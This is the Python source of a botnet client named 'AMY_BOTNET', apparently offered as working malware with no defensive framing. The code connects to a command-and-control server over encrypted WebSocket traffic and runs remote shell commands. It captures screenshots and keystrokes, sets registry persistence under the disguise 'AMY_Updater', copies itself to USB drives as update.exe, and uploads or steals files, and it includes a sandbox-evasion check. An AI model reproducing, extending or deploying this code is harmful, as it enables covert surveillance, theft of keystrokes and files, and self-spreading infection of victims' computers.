import asyncio
import websockets
import sys
import subprocess
import os
import time
import random
import socket
import base64
import io
import shutil
import ctypes
import platform
import threading
from PIL import ImageGrab
from pynput import keyboard
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# 32 bytes key for AES-256
AES_KEY = b"AMY_BOTNET_2026_SECRET_KEY_1337A"

def encrypt_message(msg: str) -> str:
    aesgcm = AESGCM(AES_KEY)
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, msg.encode('utf-8'), None)
    return base64.b64encode(nonce + ct).decode('utf-8')

def decrypt_message(encoded: str) -> str:
    try:
        data = base64.b64decode(encoded)
        nonce, ct = data[:12], data[12:]
        aesgcm = AESGCM(AES_KEY)
        return aesgcm.decrypt(nonce, ct, None).decode('utf-8', errors='ignore')
    except Exception:
        return ""

# Anti-Detection (Uptime Check instead of IsDebuggerPresent)
def anti_analysis():
    try:
        if platform.system() == "Windows":
            # Check uptime, sandboxes often have very low uptime
            uptime = ctypes.windll.kernel32.GetTickCount64()
            if uptime < 10 * 60 * 1000:  # 10 minutes
                os._exit(0)
    except:
        pass

# anti_analysis()

keylog_buffer = ""

def on_press(key):
    global keylog_buffer
    try:
        keylog_buffer += str(key.char)
    except:
        keylog_buffer += f" [{key}] "

async def bot_client(bot_id: str):
    # Simulated DNS resolution for C2 Servers to hide IP
    try:
        c2_ip = socket.gethostbyname("localhost") # In real case: c2.domain.com
        C2_SERVERS = [f"ws://{c2_ip}:8000/ws/{bot_id}"]
    except:
        C2_SERVERS = [f"ws://127.0.0.1:8000/ws/{bot_id}"]

    while True:
        try:
            server = random.choice(C2_SERVERS)
            async with websockets.connect(server) as ws:
                print(f"[+] Bot {bot_id} connected")

                threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).join(), daemon=True).start()

                while True:
                    await asyncio.sleep(random.uniform(0.6, 2.8))

                    encrypted_cmd = await ws.recv()
                    command = decrypt_message(encrypted_cmd)
                    if not command:
                        continue

                    if command.startswith("shell:"):
                        cmd = command[6:]
                        proc = await asyncio.create_subprocess_shell(
                            cmd,
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE
                        )
                        stdout, stderr = await proc.communicate()
                        result = (stdout + stderr).decode('cp866', errors='ignore') if os.name == 'nt' else (stdout + stderr).decode('utf-8', errors='ignore')
                        if not result.strip():
                            result = "Command executed."
                        await ws.send(encrypt_message(f"TERMINAL:\n{result}"))

                    elif command == "screenshot":
                        screenshot = ImageGrab.grab()
                        buffer = io.BytesIO()
                        screenshot.save(buffer, format="PNG")
                        await ws.send(encrypt_message(f"SCREENSHOT:{base64.b64encode(buffer.getvalue()).decode()}"))

                    elif command == "start_keylogger":
                        global keylog_buffer
                        if keylog_buffer:
                            await ws.send(encrypt_message(f"KEYLOG:{keylog_buffer}"))
                            keylog_buffer = ""

                    elif command == "add_persistence":
                        # Windows persistence via Registry
                        try:
                            if os.name == 'nt':
                                import winreg
                                exe_path = os.path.abspath(sys.argv[0])
                                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                                winreg.SetValueEx(key, "AMY_Updater", 0, winreg.REG_SZ, f'python "{exe_path}" {bot_id}')
                                winreg.CloseKey(key)
                                await ws.send(encrypt_message("TERMINAL:Persistence added (Registry)"))
                            else:
                                await ws.send(encrypt_message("TERMINAL:Persistence only supported on Windows"))
                        except Exception as e:
                            await ws.send(encrypt_message(f"TERMINAL:Persistence failed: {e}"))

                    elif command == "start_spreading":
                        # Простий spreading через USB
                        try:
                            for drive in "DEFGHIJKLMNOPQRSTUVWXYZ":
                                path = f"{drive}:\\"
                                if os.path.exists(path):
                                    shutil.copy(sys.argv[0], path + "update.exe")
                            await ws.send(encrypt_message("TERMINAL:Spreading attempted"))
                        except Exception as e:
                            await ws.send(encrypt_message(f"TERMINAL:Spreading failed: {e}"))

                    elif command == "list_files":
                        files = [f for f in os.listdir(".") if os.path.isfile(f)]
                        await ws.send(encrypt_message(f"TERMINAL:FILES: {','.join(files)}"))

                    elif command.startswith("upload:"):
                        try:
                            _, filename, encoded = command.split(":", 2)
                            content = base64.b64decode(encoded)
                            with open(filename, "wb") as f:
                                f.write(content)
                            await ws.send(encrypt_message(f"TERMINAL:File {filename} uploaded successfully"))
                        except Exception as e:
                            await ws.send(encrypt_message(f"TERMINAL:Upload failed: {e}"))

                    elif command.startswith("download_file:"):
                        try:
                            filename = command.split(":", 1)[1]
                            with open(filename, "rb") as f:
                                content = f.read()
                            encoded = base64.b64encode(content).decode()
                            await ws.send(encrypt_message(f"FILE:{filename}:{encoded}"))
                        except Exception as e:
                            await ws.send(encrypt_message(f"TERMINAL:Download failed: {e}"))

                    else:
                        await ws.send(encrypt_message("TERMINAL:OK"))

        except Exception:
            await asyncio.sleep(random.uniform(8, 25))

if __name__ == "__main__":
    bot_id = sys.argv[1] if len(sys.argv) > 1 else f"bot-{os.urandom(4).hex()}"
    asyncio.run(bot_client(bot_id))
